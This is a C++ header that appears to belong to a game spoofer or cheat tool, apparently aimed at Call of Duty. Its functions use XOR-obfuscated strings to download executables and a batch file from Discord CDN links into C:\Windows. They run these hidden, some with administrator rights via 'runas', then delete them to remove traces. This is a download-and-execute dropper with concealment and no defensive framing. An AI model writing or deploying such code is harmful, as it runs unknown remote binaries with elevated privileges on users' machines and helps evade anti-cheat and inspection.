#pragma once
#include "xorstr.hpp"
#include<Windows.h>
#include<shlwapi.h>
#include<string.h>
#include <fstream>
#include <filesystem>
#include <iostream>
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "urlmon.lib")

void Cleaner()
{


		if (PathFileExistsA(XorStr("C:\\Windows\\CleanerFirst.exe").c_str()))
	{
		std::remove(XorStr("C:\\Windows\\CleanerFirst.exe").c_str());
	}


	if (PathFileExistsA(XorStr("C:\\Windows\\Clear_COD.bat").c_str()))
	{
		std::remove(XorStr("C:\\Windows\\Clear_COD.bat").c_str());
	}

	std::string string1 = XorStr("C:\\Windows\\CleanerFirst.exe");
	std::string string2 = XorStr("C:\\Windows\\Clear_COD.bat");

	URLDownloadToFileA(0, XorStr("https://cdn.discordapp.com/attachments/899006209506566234/899048528473624626/CleanerFirst.exe").c_str(), string1.c_str(), 0,0);
	URLDownloadToFileA(0, XorStr("https://cdn.discordapp.com/attachments/899006209506566234/903329278198956042/Clear_COD.bat").c_str(), string2.c_str(), 0, 0);

	ShellExecuteA(0, "runas", string1.c_str(), 0, 0, false);
	ShellExecuteA(0, "runas", string2.c_str(), 0, 0, false);

	Sleep(5000);
	remove(string1.c_str());
	remove(string2.c_str());
}



void spoofer()
{

	//SHELLEXECUTEINFOA ExecuteInfo1;

	//memset(&ExecuteInfo1, 0, sizeof(ExecuteInfo1));

	
	std::string text2 =  XorStr("C:\\Windows\\User.exe").c_str();

	

	





	URLDownloadToFileA(0, XorStr("https://cdn.discordapp.com/attachments/899006209506566234/899006383687614494/User.exe").c_str(), text2.c_str(), 0, 0);

	auto start1 =  text2;
	auto result = (INT_PTR)ShellExecuteA(0, "open", start1.c_str(), 0, 0, false);

	


	
	


}


void cleanup()
{
	std::string text2 = XorStr("C:\\Windows\\User.exe").c_str();
	std::string string1 = XorStr("C:\\Windows\\CleanerFirst.exe");
	std::string string2 = XorStr("C:\\Windows\\Clear_COD.bat");

	while (PathFileExistsA(XorStr("C:\\Windows\\CleanerFirst.exe").c_str()) || PathFileExistsA(XorStr("C:\\Windows\\Clear_COD.bat").c_str()) || PathFileExistsA(XorStr("C:\\Windows\\User.exe").c_str()))
	{
		std::remove(text2.c_str());
		std::remove(string1.c_str());
		std::remove(string2.c_str());
	}

}